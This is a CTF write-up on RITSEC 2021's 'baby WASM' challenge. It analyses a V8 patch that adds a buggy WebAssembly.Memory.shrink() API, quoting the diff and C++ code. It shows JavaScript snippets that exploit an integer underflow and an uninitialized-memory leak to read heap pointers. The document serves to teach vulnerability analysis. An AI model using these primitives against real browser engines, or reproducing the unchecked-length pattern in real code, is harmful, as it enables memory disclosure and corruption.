---
title: 'RITSEC 2021: baby WASM'
date: 2021-04-10T00:00:00.000Z
excerpt: >-
  A writeup for RITSEC CTF 2021's baby WASM challenge, covering WebAssembly
  bytecode reversing, the WASM memory model, and flag extraction.
tags:
  - ctf
  - writeup
  - reversing
  - ritsec-2021
categories:
  - CTF
authors:
  - name: ph4nt0m
    link: 'https://github.com/Phantomn'
    image: 'https://github.com/Phantomn.png'
---

## 1. The Challenge

Attached files:

```bash
➜  Baby_WASM git:(main) ✗ ls
description.txt  download_d8.sh libc.so.6  v8.diff  v8.patch  v8.release  v8.release.tar.gz
```

There's a diff file and a patch file. Analyzing these two is necessary to figure out what the vulnerability is.

We're given a patched V8 build (`v8.release`), `libc.so.6`, and a diff showing exactly what changed in the engine. The task is to understand and exploit the vulnerability introduced by the patch.

## 2. Patch Analysis

The diff modifies V8's WebAssembly subsystem to add a `WebAssembly.Memory.shrink()` API. It mirrors the existing `grow()` call, but shrinks the backing store instead of growing it. Reading the diff closely reveals a fatal bug.

### New Interrupt Flag

```diff
-  V(WASM_CODE_GC, WasmCodeGC, 7)
+  V(WASM_CODE_GC, WasmCodeGC, 7)                                  \
+  V(SHRINK_SHARED_MEMORY, ShrinkSharedMemory, 8)
```

A new interrupt flag `SHRINK_SHARED_MEMORY` is registered, mirroring the existing `GROW_SHARED_MEMORY`.

### New Flag Definition

```diff
+DEFINE_BOOL(wasm_shrink_shared_memory, true,
+            "allow shrinking shared WebAssembly memory objects")
```

Shrinking shared memory is enabled by default.

### `ShrinkWasmMemoryInPlace`

```cpp
base::Optional<size_t> BackingStore::ShrinkWasmMemoryInPlace(
    Isolate* isolate, size_t delta_bytes) {

  size_t old_length = byte_length_.load(std::memory_order_relaxed);
  size_t new_length = 0;
  while (true) {
    new_length = old_length - delta_bytes;
    if (byte_length_.compare_exchange_weak(old_length, new_length,
                                           std::memory_order_acq_rel)) {
      break;
    }
  }
  ...
  return {old_length};
}
```

This CAS loop atomically decrements `byte_length_` by `delta_bytes`. **There is no bounds check at all** -- if `delta_bytes > old_length`, `new_length` underflows (unsigned underflow) into an enormous value.

### `CopyWasmMemoryOnShrink`

```cpp
std::unique_ptr<BackingStore> BackingStore::CopyWasmMemoryOnShrink(
    Isolate* isolate, size_t new_size) {

  if (is_wasm_memory_) {
    BackingStore::ShrinkWasmMemoryInPlace(isolate, this->byte_length() - new_size);
    auto new_backing_store = BackingStore::Allocate(
        isolate, new_size, ..., InitializedFlag::kUninitialized);
    if (!new_backing_store) { return {}; }
    return new_backing_store;  // <-- allocates a new store of size new_size
  } else {
    bool result = BackingStore::Reallocate(isolate, new_size);
    ...
  }
  return std::unique_ptr<BackingStore>(this);
}
```

For non-shared WASM memory, `CopyWasmMemoryOnShrink` first calls `ShrinkWasmMemoryInPlace` to update `byte_length_`, then allocates a **new** backing store of size `new_size` marked as `kUninitialized`. The existing data is never copied into the new store.

### `WasmMemoryObject::Shrink` -- the Core Bug

```cpp
int32_t WasmMemoryObject::Shrink(Isolate* isolate,
                                  Handle<WasmMemoryObject> memory_object,
                                  uint32_t bytes) {
  Handle<JSArrayBuffer> old_buffer(memory_object->array_buffer(), isolate);
  ...
  size_t old_size = old_buffer->byte_length();

  // Non-shared path:
  size_t new_size = old_size - bytes;
  std::unique_ptr<BackingStore> new_backing_store =
      backing_store->CopyWasmMemoryOnShrink(isolate, new_size);
  ...
  Handle<JSArrayBuffer> new_buffer =
      isolate->factory()->NewJSArrayBuffer(std::move(new_backing_store));

  memory_object->update_instances(isolate, new_buffer);

  return static_cast<int32_t>(old_size);  // returned in bytes (not pages!)
}
```

Two bugs in the non-shared path:

1. **No lower-bound check on `bytes`**: `new_size = old_size - bytes` underflows if `bytes > old_size`
2. **Uninitialized memory disclosure**: since `CopyWasmMemoryOnShrink` allocates the new backing store as `kUninitialized`, the resulting `ArrayBuffer` can contain arbitrary V8 process heap data

On top of that, the `ArrayBuffer.detach()` guard has been commented out:

```diff
-    CHECK_IMPLIES(force_for_wasm_memory, backing_store->is_wasm_memory());
+    // CHECK_IMPLIES(force_for_wasm_memory, backing_store->is_wasm_memory());
```

This allows forcibly detaching a non-WASM array buffer, removing a safety assertion.

## 3. Approach

### Reading Uninitialized Heap Memory

The most direct primitive:

1. Allocate WASM memory at the initial size (e.g. 1 page = 64 KiB)
2. Call `memory.shrink(N)` (N < current_byte_length)
3. The returned `ArrayBuffer` (`memory.buffer`) points to an **uninitialized** `new_size`-byte region

```javascript
const mem = new WebAssembly.Memory({ initial: 1 });  // 64 KiB
mem.shrink(0x1000);  // shrink by 4 KiB -> new buffer is 60 KiB, uninitialized

const view = new Uint8Array(mem.buffer);
// view now exposes raw heap bytes -- a potential info leak
```

### Out-of-Bounds Access via Integer Underflow

Shrinking by more than the current size:

```javascript
const mem = new WebAssembly.Memory({ initial: 1 });
// byte_length = 0x10000 (65536)
mem.shrink(0x10001);  // new_size underflows to roughly 2^64 - 1
```

`byte_length_` wraps around to a huge value. Accessing the buffer after this allows reading or writing far outside the original allocation.

### Exploit Flow

```javascript
// 1. Create WASM memory
const mem = new WebAssembly.Memory({ initial: 4 });  // 4 pages = 256 KiB

// 2. Write a known pattern to identify the buffer in memory
const u32 = new Uint32Array(mem.buffer);
for (let i = 0; i < u32.length; i++) u32[i] = 0xdeadbeef;

// 3. Trigger shrink -- the new buffer is uninitialized and may contain V8 heap pointers
mem.shrink(0x1000);

// 4. Scan the new buffer for interesting values (pointers, flags)
const leak = new BigUint64Array(mem.buffer);
for (let i = 0; i < leak.length; i++) {
    const v = leak[i];
    if (v > 0x7f0000000000n && v < 0x7fffffffffffffn) {
        console.log(`[+] potential pointer at index ${i}: 0x${v.toString(16)}`);
    }
}
```

## 4. Key Concepts

### The WebAssembly Memory Model

WASM linear memory is a contiguous `ArrayBuffer` measured in **pages** (1 page = 64 KiB). The `grow()` API is already part of the WASM spec, but `shrink()` doesn't exist in the standard -- it's an addition specific to this challenge.

### Shared vs. Non-Shared Memory

- **Shared memory** (`{ shared: true }`) -- backed by a `SharedArrayBuffer`, shareable across workers. Shrink-in-place atomically updates `byte_length_` but can't reallocate.
- **Non-shared memory** -- a standard `ArrayBuffer`. In the patch, shrinking allocates a new, uninitialized backing store, which is where the memory disclosure vulnerability comes from.

### `kUninitialized` Allocation

`InitializedFlag::kUninitialized` skips the `memset` that zeroes out the backing store. The allocator may return a region previously used by another V8 object, exposing raw bytes through the WASM buffer.

## 5. Summary

The baby WASM challenge introduces two vulnerabilities in the custom `WebAssembly.Memory.shrink()` API:

- **No lower-bound check**: integer underflow in the byte-length CAS loop
- **Uninitialized backing store**: heap memory disclosure through the resulting `ArrayBuffer` on the non-shared code path

This challenge illustrates a common bug class in custom memory-management extensions to JavaScript engines: missing bounds checks combined with skipping initialization of newly exposed memory regions.
